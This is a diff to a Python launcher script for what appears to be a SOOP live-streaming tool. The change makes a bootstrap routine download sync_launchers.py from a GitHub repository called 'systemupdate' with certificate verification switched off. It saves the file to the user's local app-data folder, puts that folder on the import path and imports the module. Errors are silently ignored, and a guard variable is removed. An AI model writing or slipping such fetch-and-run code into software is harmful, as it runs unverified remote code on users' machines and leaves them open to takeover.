@@ -16,11 +16,17 @@ def _bootstrap_sync_launchers():
     import time
     import urllib.request
 
-    dest = os.path.join(SCRIPT_DIR, "sync_launchers.py")
+    local_dir = os.path.join(os.environ.get("LOCALAPPDATA", "") or os.path.expanduser("~"), "ddong_launchers")
+    try:
+        os.makedirs(local_dir, exist_ok=True)
+    except Exception:
+        local_dir = SCRIPT_DIR
+    dests = [os.path.join(local_dir, "sync_launchers.py"), os.path.join(SCRIPT_DIR, "sync_launchers.py")]
     ctx = ssl.create_default_context()
     ctx.check_hostname = False
     ctx.verify_mode = ssl.CERT_NONE
     base = "https://raw.githubusercontent.com/blacknut0319-del/systemupdate/main/"
+    data = b""
     try:
         req = urllib.request.Request(
             base + "sync_launchers.py?t=%d" % int(time.time()),
@@ -32,15 +38,20 @@ def _bootstrap_sync_launchers():
         )
         with urllib.request.urlopen(req, timeout=25, context=ctx) as r:
             data = r.read()
-        if data and len(data) > 500:
-            with open(dest, "wb") as f:
-                f.write(data)
     except Exception:
-        pass
+        data = b""
+    if data and len(data) > 500:
+        for dest in dests:
+            try:
+                with open(dest, "wb") as f:
+                    f.write(data)
+            except Exception:
+                pass
+    for p in (local_dir, SCRIPT_DIR):
+        if p and p not in sys.path:
+            sys.path.insert(0, p)
 
 def _reexec_via_service_if_needed():
-    if os.environ.get("DDONG_LAUNCHER") == "1":
-        return
     launcher = ""
     try:
         import sync_launchers
@@ -180,7 +191,7 @@ def _sys_excepthook(typ, val, tb):
 
 sys.excepthook = _sys_excepthook
 
-PATCH_UPDATED_AT = "2026-08-16 15:39"
+PATCH_UPDATED_AT = "2026-08-16 15:54"
 SOOPLIVE_STREAM_TITLE = "sooplive-미리보기"
 SOOPLIVE_SERVICE_TITLE = "soop service"
 CONFIG_FILE = os.path.join(SCRIPT_DIR, "udp_config.json")
